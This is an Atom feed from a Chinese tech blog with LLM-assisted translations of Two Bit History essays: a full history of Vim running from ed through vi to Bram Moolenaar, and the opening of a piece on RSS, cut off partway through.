<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh"><generator uri="https://gohugo.io/" version="0.139.4">Hugo</generator><title type="html">not b@tk1z</title><link href="https://blog.batkiz.com/" rel="alternate" type="text/html" title="html"/><link href="https://blog.batkiz.com/atom.xml" rel="self" type="application/atom" title="atom"/><updated>2025-07-14T16:28:17+00:00</updated><rights>by Jinglue</rights><author><name>Jinglue</name><email>batkiz@outlook.com</email></author><id>https://blog.batkiz.com/</id><entry><title type="html">twobithistory 内容翻译</title><link href="https://blog.batkiz.com/posts/translations-on-twobithistory/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/translations-on-twobithistory/</id><published>2025-07-08T16:00:15+08:00</published><updated>2025-07-08T16:00:15+08:00</updated><content type="html"><![CDATA[<p>首先非常感谢 <a href="https://twobithistory.org/">Two-Bit History</a> 的内容。</p>
<p><a href="https://github.com/Par-Tuner/translations/tree/master/twobithistory">https://github.com/Par-Tuner/translations/tree/master/twobithistory</a></p>
<p>在 GitHub Copilot 与 Google Gemini 的帮助下，写了两段小脚本，把 twobithistory 的文章都爬下来做了个归档，并且翻译了下。</p>
<p>不过大模型输出的内容还没能完全让我满意：</p>
<ul>
<li>偶尔会莫名其妙缺些东西，比如脚注内容</li>
<li>引用内容有些翻译了有些没翻</li>
<li>有些 url 过了遍 LLM 后发生了改变……</li>
<li>虽然写了代码块内的翻译规则，但是非常上古的冷门语言会识别出问题</li>
</ul>
<p>但是虽然有这些问题，Gemini 2.5 Flash 的翻译质量整体上还是很不错的，期待后续模型能力的进化，以及我琢磨琢磨提示词和流程修改。</p>
<p>为了避免污染文章流，就不把所有文章都搬来了，只列几篇我比较推荐的内容：</p>
<ul>
<li><a href="https://github.com/Par-Tuner/translations/blob/master/twobithistory/rest.md">Roy Fielding 被“挪用”的 REST 博士论文</a>：补齐了些我对 REST 的历史认知，一个创建者在提出时候就反复强调“没有银弹”的设计，却在后续被无数人奉为圭臬，也是蛮幽默的。</li>
<li><a href="https://github.com/Par-Tuner/translations/blob/master/twobithistory/cat.md">cat 命令的“身世之谜”</a>：cat 命令历史上主要实现的时间线，没想到竟然这么久都没什么实质改动了（也怪不得好些命令都被 RIIR 了</li>
<li><a href="https://github.com/Par-Tuner/translations/blob/master/twobithistory/chaosnet.md">Chaosnet 的简短历史</a></li>
<li><a href="https://github.com/Par-Tuner/translations/blob/master/twobithistory/readline.md">你可能不知道的 GNU Readline</a>：刚好和前面转发过 <a href="https://t.me/c/1459082815/848">灰哥的内容</a> 对应上，没想到 Ramey 还维护了 readline（好吧我承认之前没点进 Ramey 的主页看）</li>
</ul>
<blockquote>
<p>Ramey 至今已在 Bash 和 Readline 上工作了十多年。他从未因其工作获得过报酬——他现在是，也一直是一名志愿者。Bash 和 Readline 仍在积极开发中，尽管 Ramey 表示 Readline 的变化比 Bash 慢得多。我问 Ramey 独自维护如此多人使用的软件是何感受。他说，数百万人可能在不知不觉中使用 Bash ( 因为每台 Apple 设备都运行 Bash )，这让他担心一个破坏性变更可能造成多大的干扰。但他已经慢慢习惯了有那么多人使用他的软件这个事实。他说他继续在 Bash 和 Readline 上工作，因为目前他投入很深，而且他只是喜欢向世界提供有用的软件。</p>
</blockquote>
<ul>
<li><a href="https://github.com/Par-Tuner/translations/blob/master/twobithistory/semantic-web.md">语义网 ( Semantic Web ) 究竟去哪儿了？</a>：第一部分恍然间我还以为在读什么 LLM、MCP……也算是某种螺旋上升吧</li>
</ul>
]]></content></entry><entry><title type="html">Vim 的起源</title><link href="https://blog.batkiz.com/posts/ai-translation-where-vim-came-from/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/ai-translation-where-vim-came-from/</id><published>2025-07-06T00:07:55+08:00</published><updated>2025-07-06T00:07:55+08:00</updated><content type="html"><![CDATA[<p>2018 年，那个 GPT-2 都还未出现的年代，我在网上偶然看到了 Two Bit History 的数篇博文，其内容对于刚刚大学入学、接触计算机的我带来了非常多的震撼，各种各样的历史、发展、相关人士信手拈来，在当时也极大激发了我的热情。在当时这种热情的激发下，我花了几个晚上的时间翻译了其两篇文章，甚至还投稿去了煎蛋。不过说实话我的翻译水平确实很烂，当时在煎蛋上就看到了几个类似的评价，现在读来也确实觉得很不通顺。</p>
<p>不过现在我们不止有了 GPT-2，我们还拥有着更先进的种种大模型（在此着重致谢各家的免费产品，尤其是 Gemini），在大模型以及恰当的提示词的帮助下，翻译文章这种事情变得非常简单了。因此，最近我借助大模型的能力，将之前的两篇文章重新翻译了下，姑且重置一下，也免得辣到不小心点进来的朋友们的眼睛。</p>
<p>刚才也去 X (formerly Twitter) 看了眼，发现 Two Bit History 的动态也停止在了 2021 年 3 月，一晃眼也是好多年了。</p>
<p>原文：<a href="https://twobithistory.org/2018/08/05/where-vim-came-from.html">Where Vim Came From</a></p>
<hr>
<p>最近，我偶然接触到一种名为 Intel HEX 的文件格式。据我了解，Intel HEX 文件 (扩展名为 <code>.hex</code>) 的作用，是通过将二进制图像编码成一行行十六进制数字，让原本难以捉摸的二进制内容变得更直观一些。一般是给微控制器 (microcontrollers) 编程或需要将数据烧录进只读存储器 (ROM) 的人会用到它。总之，当我第一次在 Vim 里打开一个 HEX 文件时，我被彻底震惊了。这个文件格式，至少在我看来，是如此深奥，但 Vim 却早已对它了如指掌。HEX 文件的每一行都是一条记录，被划分为不同字段——而 Vim 早就贴心地用不同颜色标亮了每个字段。我敬畏地输入 <code>:set ft?</code> 并按下回车。“<code>filetype=hex</code>”，Vim 自豪地回应。</p>
<p>Vim 的身影无处不在。它的用户群体如此庞大，以至于支持 HEX 这种小众格式其实不足为奇。macOS 系统预装了 Vim，它在 Linux 世界里也拥有一大批忠实拥趸。就连那些讨厌它的人也对它不陌生，因为有太多流行的命令行工具会默认使用 Vim 打开文件，结果导致无数新手被困在 Vim 里出不来，这甚至成了一个经久不衰的 <a href="https://stackoverflow.blog/wp-content/uploads/2017/05/meme.jpeg">梗</a>。甚至在包括 Facebook 在内的一些大型网站上，你按下 <code>j</code> 键页面就会向下滚动，按下 <code>k</code> 键就会向上滚动——这堪称 Vim 渗透数字文化的巅峰标志。</p>
<p>然而，Vim 也是一个谜。就拿 React 来说，人人都知道它由 Facebook 开发和维护，但 Vim 却似乎没有任何官方赞助商。尽管它如此普及和重要，却好像没有任何委员会或组织在为它做决策。你可以在 <a href="https://www.vim.org/">Vim 官网</a> 上逛好几分钟，但对谁创造了 Vim、又为何创造它这些问题，依然一头雾水。如果你启动 Vim 时没有指定文件名，会看到一条启动信息，说 Vim 是由 “Bram Moolenaar 等人” 开发的。但这信息量约等于零。Bram Moolenaar 是谁？他那些神秘的伙伴们又是何方神圣？</p>
<p>或许更重要的是，既然我们已经开始提问了，那为什么退出 Vim 非得用 <code>:wq</code> 这么个指令？诚然，这是“写入 (write)” 操作后面跟着“退出 (quit)” 操作，但这实在算不上什么直观的设计。又是谁决定了复制文本不叫“复制”，而叫“yanking” (yank，意为猛地一拉)？为什么 <code>:%s/foo/bar/gc</code> 这么一长串就代表了“查找并替换”？Vim 的种种奇特之处显得如此随心所欲，不像是凭空杜撰的，那么它们到底从何而来？</p>
<p>答案，一如既往地，要从那个古老的计算技术摇篮——贝尔实验室 (Bell Labs) 讲起。从某种意义上说，Vim 不过是一款软件的最新迭代版本。我们可以叫它“wq 文本编辑器”，自 Unix 纪元开启以来，它就一直处于持续的开发和改进之中。</p>
<h2 id="ken-thompson-开发的行编辑器">Ken Thompson 开发的行编辑器</h2>
<p>1966 年，贝尔实验室聘用了 Ken Thompson。Thompson 当时刚在加州大学伯克利分校获得电气工程与计算机科学硕士学位。在校期间，他曾使用过一款名为 QED 的文本编辑器，这款编辑器是 1965 到 1966 年间为伯克利分时系统编写的。<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> Thompson 到贝尔实验室后做的第一件事，就是为 MIT 兼容分时系统重写了 QED。后来，他又为 Multics 项目写了另一个版本的 QED。在这一过程中，他扩展了程序功能，让用户可以使用 正则表达式 (regular expressions) 来搜索文件中的特定行并执行替换操作。<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
<p>Multics 项目的目标是创建一个商业上可行的分时操作系统 (就像伯克利分时系统一样)，它由 MIT、通用电气和贝尔实验室三方合作。最终，AT&amp;T 认为该项目前景渺茫而选择退出。就这样，Thompson 和同在贝尔实验室的同事 Dennis Ritchie 突然没法使用分时系统了，他们非常怀念那种系统带来的“交互式计算的感觉”，于是决定自己动手打造一个。这个系统，最终以 Unix 的名字为世人所知。<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> 1969 年 8 月，趁着妻子和年幼的儿子去加州度假，Thompson 拼凑出了这个新系统的基本雏形，他计划“给操作系统、shell、编辑器和汇编器各一周的开发时间”。<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup></p>
<p>这款编辑器被命名为 <code>ed</code>。它基于 QED，但并非简单的复刻。Thompson 决定砍掉 QED 的一些特性。正则表达式 的支持被削弱了，<code>ed</code> 只能理解比较简单的正则。QED 允许用户打开多个 缓冲区 (buffer) 来同时编辑多个文件，但 <code>ed</code> 一次只能处理一个缓冲区。此外，QED 可以执行一个包含命令的缓冲区，<code>ed</code> 则完全不支持这个功能。这些简化在当时或许是必要的。Dennis Ritchie 就曾说过，缺少 QED 的高级正则表达式“算不上什么大损失”。<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup></p>
<p><code>ed</code> 现在已经是 POSIX 规范的一部分，所以只要你的系统遵循 POSIX 标准，你的电脑里就有它。<code>ed</code> 很值得把玩一番，因为它的许多命令如今已是 Vim 的一部分。例如，要把缓冲区内容写入磁盘，你得用 <code>w</code> 命令；要退出编辑器，就得用 <code>q</code> 命令。这两个命令可以写在同一行一次性执行——<code>wq</code> 就这么来了。和 Vim 一样，<code>ed</code> 也是一个 模态编辑器 (modal editor)；要从命令模式进入输入模式，你需要根据操作目的使用插入命令 (<code>i</code>)、追加命令 (<code>a</code>) 或修改命令 (<code>c</code>)。<code>ed</code> 还开创性地使用 <code>s/foo/bar/g</code> 这种语法来查找和替换文本。</p>
<p>看到这么多相似之处，你可能会觉得 Vim 用户上手 <code>ed</code> 应该毫无压力。但在另一个关键方面，<code>ed</code> 和 Vim 天差地别。<code>ed</code> 是一个纯粹的 行编辑器 (line editor)。它诞生并风靡于电传打字机 (teletype printer) 的年代。当 Ken Thompson 和 Dennis Ritchie 奋力编写 Unix 时，他们的工作场景是这样的：</p>
<p><img src="https://s2.loli.net/2024/04/13/Yzk6CW9PntxZilM.jpg" alt="Ken Thompson (坐) 和 Dennis Ritchie (站) 通过电传打字机与 PDP-11 交互。"></p>
<p><code>ed</code> 不允许你在文件的多行文本中自由移动光标并就地编辑，因为每当你修改一处，<code>ed</code> 就必须把整个文件重新打印一遍。在 1969 年，<code>ed</code> 没有任何机制能“清空”屏幕，因为所谓的“屏幕”就是一张纸，打上去的内容都是白纸黑字，覆水难收。需要时，你可以用列表命令 (<code>l</code>) 让 <code>ed</code> 打印出某几行给你看，但大多数时候，你编辑的文本是你根本看不见的。因此，用 <code>ed</code> 的感觉，就好比拿着一盏快没电的手电筒，在一间漆黑的屋子里摸索。你一次只能照亮一小块地方，所以必须竭尽全力记住屋里的一切布局。</p>
<p>下面是一个 <code>ed</code> 会话的示例。我在每行后面用 <code>#</code> 加了注释来解释其用途 (如果在真实的 <code>ed</code> 里输入这些注释，它会报错)：</p>
<pre tabindex="0"><code>[sinclairtarget 09:49 ~]$ ed
i                               # 进入输入模式
Hello world!

Isn&#39;t it a nice day?
.                               # 结束输入
1,2l                            # 列出第 1 到 2 行
Hello world!$
$
2d                              # 删除第 2 行
,l                              # 列出整个缓冲区
Hello world!$
Isn&#39;t it a nice day?$
s/nice/terrible/g               # 全局替换
,l
Hello world!$
Isn&#39;t it a terrible day?$
w foo.txt                       # 写入 foo.txt
38                              # (写入的字节数)
q                               # 退出
[sinclairtarget 10:50 ~]$ cat foo.txt
Hello world!
Isn&#39;t it a terrible day?
</code></pre><p>如你所见，<code>ed</code> 是个相当“沉默寡言”的程序。</p>
<h2 id="bill-joy-开发的文本编辑器">Bill Joy 开发的文本编辑器</h2>
<p><code>ed</code> 对于 Thompson 和 Ritchie 来说够用了。但其他人觉得它难用得要命，并给它贴上了“Unix 对新手极度不友好”的典型反面教材的标签。<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup> 1975 年，一个叫 George Coulouris 的人在伦敦玛丽女王学院的 Unix 系统上，开发了 <code>ed</code> 的一个改进版。Coulouris 编写这个编辑器时，充分利用了他在学院能接触到的视频显示器。和 <code>ed</code> 不同，Coulouris 的程序允许用户在屏幕上直接编辑一整行，并通过键盘逐字移动光标 (想象一下，只能在单行里使用 Vim)。Coulouris 将他的程序命名为 <code>em</code>，即“editor for mortals (凡人编辑器)”。据说这个名字的灵感来源于一次 Ken Thompson 的到访：Thompson 看了 Coulouris 的程序后不屑一顾，说自己编辑文件时根本不需要看到文件的实时状态。<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup></p>
<p>1976 年，Coulouris 带着 <code>em</code> 来到加州大学伯克利分校，作为计算机科学系的访问学者在这里度过了一个夏天。这恰好是 Ken Thompson 离开伯克利前往贝尔实验室的十年之后。在伯克利，Coulouris 遇到了 Bill Joy，一位正在为 伯克利软件发行版 (Berkeley Software Distribution, BSD) 忙碌的研究生。Coulouris 向 Joy 展示了 <code>em</code>，Joy 则在 <code>em</code> 的源码基础上，开发出了一个更强大的 <code>ed</code> 改进版，取名为 <code>ex</code>，意为“extended <code>ed</code> (扩展版 <code>ed</code>)”。1978 年，<code>ex</code> 的 1.1 版本随第一版 BSD Unix 一同发布。<code>ex</code> 在很大程度上与 <code>ed</code> 兼容，但新增了两种模式：一种是“开放模式”，可以像 <code>em</code> 一样进行单行编辑；另一种是“可视模式”，这种模式会占据整个屏幕，实现我们今天所习惯的对整个文件进行实时编辑。</p>
<p>在 1979 年的第二版 BSD 中，一个名为 <code>vi</code> 的可执行文件诞生了，它的功能很简单：直接在可视模式下启动 <code>ex</code>。<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup></p>
<p><code>ex</code>/<code>vi</code> (下文统称 <code>vi</code>) 奠定了我们今天所熟知的、除继承自 <code>ed</code> 之外的几乎所有 Vim 的传统。当年 Joy 使用的视频终端是 Lear Siegler ADM-3A，这款终端的键盘上没有方向键。作为替代，<code>h</code>、<code>j</code>、<code>k</code>、<code>l</code> 这几个键上印着箭头，这便是 Joy 用这几个键在 <code>vi</code> 中移动光标的原因。此外，ADM-3A 键盘上的 <code>Esc</code> 键，正好在我们今天键盘上 <code>Tab</code> 键的位置，这就解释了为什么“退出模式”这么一个高频操作，会分配给一个如今看来如此“偏僻”的按键。命令前面的冒号 <code>:</code> 也源自 <code>vi</code>，它在普通模式 (也就是运行 <code>ex</code> 后进入的模式) 下，会用 <code>:</code> 作为提示符。这解决了 <code>ed</code> 长期以来为人诟病的一点——启动后一片死寂，毫无提示。在可视模式下，保存并退出需要输入经典的 <code>:wq</code>。“yanking (复制)” 和 “putting (粘贴)”，以及标记功能和用于设置选项的 <code>set</code> 命令，都源于最初的 <code>vi</code>。可以说，我们今天在 Vim 中进行基本文本编辑所用的功能，绝大部分都来自 <code>vi</code>。</p>
<p><img src="https://s2.loli.net/2024/04/13/GnTOFa4NMpXo7di.jpg" alt="一台 Lear Siegler ADM-3A 终端的键盘。"></p>
<p>在 BSD Unix 中，除了 <code>ed</code>，<code>vi</code> 是唯一捆绑的文本编辑器。在那个年代，Emacs 可能要花费数百美元 (当时 GNU Emacs 还未问世)，因此 <code>vi</code> 迅速流行起来。但 <code>vi</code> 是 <code>ed</code> 的直系后代，这意味着没有 AT&amp;T 的源码授权，谁也不能修改它的代码。这激励了许多人去创造 <code>vi</code> 的 开源 (open-source) 版本。STEVIE (ST Editor for VI Enthusiasts) 诞生于 1987 年，Elvis 诞生于 1990 年，<code>nvi</code> 则在 1994 年问世。这些克隆版中的一些还增加了额外功能，比如 语法高亮 (syntax highlighting) 和分屏。特别是 Elvis，它的许多特性后来都被整合进了 Vim，这很大程度上要归功于 Elvis 用户们的积极推动。<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup></p>
<h2 id="bram-moolenaar-创造-vim">Bram Moolenaar 创造 Vim</h2>
<p>“Vim”，如今是“Vi Improved (Vi 改进版)”的缩写，但它最初的名字是“Vi Imitation (Vi 模仿版)”。和其它 <code>vi</code> 的克隆版一样，Vim 的诞生也是源于在一个无法使用 <code>vi</code> 的平台上复刻它的想法。Bram Moolenaar 是一位荷兰软件工程师，在荷兰芬洛的一家复印机公司工作。他想为自己全新的 Amiga 2000 电脑找一款像 <code>vi</code> 一样的工具。Moolenaar 在大学时早已习惯了在 Unix 系统上使用 <code>vi</code>，那套操作已经融入了他的指尖，形成了肌肉记忆。<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup> 于是，在 1988 年，Moolenaar 以当时已有的 <code>vi</code> 克隆版 STEVIE 为起点，开始打造 Vim。</p>
<p>Moolenaar 之所以能用上 STEVIE，是因为 STEVIE 曾被收录在一套叫“Fred Fish 磁盘”的东西里。Fred Fish 是一名美国程序员，他每个月都会向外邮寄一张软盘，里面精选了 Amiga 平台下最优秀的开源软件。任何人只要支付邮费，就能索取一张。STEVIE 的好几个版本都通过 Fred Fish 磁盘发行，Moolenaar 用的是第 256 号磁盘上的版本。<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup> (有点令人失望的是，Fred Fish 磁盘和那个卡通游戏角色 <a href="https://en.wikipedia.org/wiki/Freddi_Fish">Freddi Fish (小鲤鱼弗雷迪)</a> 似乎没什么关系。)</p>
<p>Moolenaar 很喜欢 STEVIE，但很快就发现它缺少了许多 <code>vi</code> 的命令。<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup> 因此，在 Vim 的第一个版本里，Moolenaar 将兼容 <code>vi</code> 作为首要目标。当时，有人写了一套 <code>vi</code> 宏，只要编辑器能完美兼容 <code>vi</code>，运行这套宏就能解开一个 <a href="https://github.com/isaacs/.vim/tree/master/macros/maze">随机生成的迷宫</a>。Moolenaar 最终成功让这套宏在 Vim 里跑了起来。1991 年，Vim 作为“Vi Imitation”首次在第 591 号 Fred Fish 磁盘上发布。<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup> Moolenaar 已经为它添加了一些新功能 (包括多级撤销和针对编译器错误的“快速修复”模式)，这意味着 Vim 此时已超越了 <code>vi</code>。但直到 1993 年通过 FTP 发布的 Vim 2.0，它才正式告别“Vi Imitation”这个名字。</p>
<p>在互联网上各路协作者的偶尔帮助下，Moolenaar 稳步地为 Vim 添加新功能。Vim 2.0 引入了对 <code>wrap</code> (自动换行) 选项和长文本行水平滚动的支持。Vim 3.0 增加了分屏和缓冲区支持，这个功能的灵感来源于 <code>vi</code> 的另一个克隆版 <code>nvi</code>。Vim 还开始将每个缓冲区存入一个 交换文件 (swap file)，这样即使程序崩溃，编辑过的内容也能恢复。Vimscript 在 Vim 5.0 中首次亮相，一同出现的还有语法高亮功能。在这一切发生的同时，Vim 的声望与日俱增。它被移植到了 MS-DOS、Windows、Mac，甚至还“反攻”回了 Unix，与原版 <code>vi</code> 一较高下。</p>
<p>2006 年，Vim 被《Linux Journal》的读者票选为最受欢迎的编辑器。<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup> 时至今日，根据 Stack Overflow 2018 年的开发者调查，Vim 是最受欢迎的文本模式 (即在终端模拟器中运行) 编辑器，有 25.8% 的软件开发者 (以及 40% 的系统管理员/DevOps 工程师) 在使用它。<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup> 在上世纪 80 年代末到整个 90 年代，程序员之间曾爆发过一场“编辑器战争”，将 Emacs 用户和 <code>vi</code> (以及后来的 Vim) 用户划分为两大对立阵营。尽管 Emacs 至今无疑仍有拥趸，但一些人认为，这场战争已经结束，Vim 最终胜出。<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup> 2018 年 Stack Overflow 的调查数据似乎也印证了这一点：只有 4.1% 的受访者使用 Emacs。</p>
<p>Vim 为何能如此成功？显然，人们喜爱 Vim 提供的各种功能。但我认为，Vim 悠久的历史说明，它的优势远不止功能集那么简单。Vim 的代码库最早只能追溯到 1988 年，也就是 Moolenaar 开始开发它的那年。但“wq 文本编辑器”——这个关于类 Unix 文本编辑器应如何设计的宏大构想——却已存在了半个世纪之久。“wq 文本编辑器”有过几种不同的具体实现，但很大程度上得益于 Bill Joy 和 Bram Moolenaar 对向后兼容性的异乎寻常的重视，各种绝妙的创意得以随着时间推移不断累积。从这个意义上讲，“wq 文本编辑器”是史上持续时间最长、最成功的开源项目之一，它曾汇聚了计算机世界里一些最顶尖大脑的智慧与贡献。我并非认为“创业公司抛弃一切传统，创造颠覆性新软件”的开发模式有什么不好，但 Vim 的故事提醒着我们：协作与迭代，同样能创造奇迹。</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Butler Lampson, “Systems,” Butler Lampson, accessed August 5, 2018, <a href="http://bwlampson.site/Systems.htm">http://bwlampson.site/Systems.htm</a>.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Dennis Ritchie, “An Incomplete History of the QED Editor,” accessed August 5, 2018, <a href="https://www.bell-labs.com/usr/dmr/www/qed.html">https://www.bell-labs.com/usr/dmr/www/qed.html</a>.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Peter Salus, “The Daemon, the GNU, and the Penguin,” Groklaw, April 14, 2005, accessed August 5, 2018, <a href="http://www.groklaw.net/article.php?story=20050414215646742">http://www.groklaw.net/article.php?story=20050414215646742</a>.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>ibid.（同上）&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>Dennis Ritchie, “An Incomplete History of the QED Editor,” accessed August 5, 2018, <a href="https://www.bell-labs.com/usr/dmr/www/qed.html">https://www.bell-labs.com/usr/dmr/www/qed.html</a>.&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>Donald Norman, “The Truth about Unix: The User Interface Is Horrid,” Datamation, accessed August 5, 2018, <a href="http://www.ceri.memphis.edu/people/smalley/ESCI7205_misc_files/The_truth_about_Unix_cleaned.pdf">http://www.ceri.memphis.edu/people/smalley/ESCI7205_misc_files/The_truth_about_Unix_cleaned.pdf</a>.&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>George Coulouris, “George Coulouris: A Bit of History,” George Coulouris’ Homepage, September 1998, accessed August 5, 2018, <a href="http://www.eecs.qmul.ac.uk/~gc/history/index.html">http://www.eecs.qmul.ac.uk/~gc/history/index.html</a>.&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>“Second Berkeley Software Distribution Manual,” Roguelife, accessed August 5, 2018, <a href="http://roguelife.org/~fujita/COOKIES/HISTORY/2BSD/vi.u.html">http://roguelife.org/~fujita/COOKIES/HISTORY/2BSD/vi.u.html</a>.&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>Sven Guckes, “VIM Wishlist,” Vmunix, May 15, 1995, accessed August 5, 2018, <a href="https://web.archive.org/web/20080520075925/http://www.vmunix.com/vim/wish.html">https://web.archive.org/web/20080520075925/http://www.vmunix.com/vim/wish.html</a>.&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>Bram Moolenaar, “Vim 25” (lecture, Zurich, November 2, 2016), December 13, 2016, accessed August 5, 2018, <a href="https://www.youtube.com/watch?v=ayc_qpB-93o&amp;t=4m58">https://www.youtube.com/watch?v=ayc_qpB-93o&t=4m58</a>s&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>ibid. (?t=6m15s)&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>ibid. (?t=7m6s)&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>“Fish Disks 1 - 1120,” Amiga Stuff, accessed August 5, 2018, <a href="http://www.amiga-stuff.com/pd/fish.html">http://www.amiga-stuff.com/pd/fish.html</a>.&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:14">
<p>“2005 Linux Journal Reader’s Choice Awards,” Linux Journal, September 28, 2005, accessed August 5, 2018, <a href="https://www.linuxjournal.com/article/8520#N0x850cd80.0x87983bc">https://www.linuxjournal.com/article/8520#N0x850cd80.0x87983bc</a>.&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:15">
<p>“Stack Overflow Developer Survey 2018,” Stack Overflow, accessed August 5, 2018, <a href="https://insights.stackoverflow.com/survey/2018/#development-environments-and-tools">https://insights.stackoverflow.com/survey/2018/#development-environments-and-tools</a>.&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:16">
<p>Bruce Byfield, “The End of the Editor Wars,” Linux Magazine, May 11, 2015, accessed August 5, 2018, <a href="http://www.linux-magazine.com/Online/Blogs/Off-the-Beat-Bruce-Byfield-s-Blog/The-End-of-the-Editor-Wars">http://www.linux-magazine.com/Online/Blogs/Off-the-Beat-Bruce-Byfield-s-Blog/The-End-of-the-Editor-Wars</a>.&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content></entry><entry><title type="html">RSS 的兴起与消亡</title><link href="https://blog.batkiz.com/posts/ai-translation-the-rise-and-demise-of-rss/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/ai-translation-the-rise-and-demise-of-rss/</id><published>2025-07-05T22:58:53+08:00</published><updated>2025-07-05T22:58:53+08:00</updated><content type="html"><![CDATA[<p>2018 年，那个 GPT-2 都还未出现的年代，我在网上偶然看到了 Two Bit History 的数篇博文，其内容对于刚刚大学入学、接触计算机的我带来了非常多的震撼，各种各样的历史、发展、相关人士信手拈来，在当时也极大激发了我的热情。在当时这种热情的激发下，我花了几个晚上的时间翻译了其两篇文章，甚至还投稿去了煎蛋。不过说实话我的翻译水平确实很烂，当时在煎蛋上就看到了几个类似的评价，现在读来也确实觉得很不通顺。</p>
<p>不过现在我们不止有了 GPT-2，我们还拥有着更先进的种种大模型（在此着重致谢各家的免费产品，尤其是 Gemini），在大模型以及恰当的提示词的帮助下，翻译文章这种事情变得非常简单了。因此，最近我借助大模型的能力，将之前的两篇文章重新翻译了下，姑且重置一下，也免得辣到不小心点进来的朋友们的眼睛。</p>
<p>刚才也去 X (formerly Twitter) 看了眼，发现 Two Bit History 的动态也停止在了 2021 年 3 月，一晃眼也是好多年了。</p>
<p>原文：<a href="https://twobithistory.org/2018/12/18/rss.html">The Rise and Demise of RSS</a></p>
<hr>
<p><em>本文初版发布于 <a href="https://twobithistory.org/2018/09/16/the-rise-and-demise-of-rss.html">2018年9月16日</a>。此为修订版，增补了对 Ramanathan Guha、Ian Davis、Dan Libby 和 Kevin Werbach 的访谈内容。</em></p>
<p><em>本文的另一个版本也曾发表于 <a href="https://www.vice.com/en_us/article/a3mm4z/the-rise-and-demise-of-rss">Vice News</a>。</em></p>
<p>大约在十年多前，随便一位网民可能都听说过 RSS。RSS 的全称有两个版本，你可以叫它“真正简单的整合” (Really Simple Syndication)，也可以叫它“丰富站点摘要” (Rich Site Summary)，这取决于你问的是谁。它是一种标准，网站和播客可以通过它向用户提供内容订阅源，并且这种格式能被各种各样的电脑程序轻松解析。然而时至今日，尽管 RSS 仍在为网络上的许多应用提供着动力，但对大多数人来说，它已经成了一门鲜为人知的“古老”技术。</p>
<p>要说清 RSS 的故事，我们得从两条线索讲起。第一条线索，是关于一个宏大却从未完全实现的Web未来构想。第二条线索，则是一场本想齐心协力改进流行标准的技术合作，最终如何演变成了开源软件开发史上最激烈的“路线之争”之一。</p>
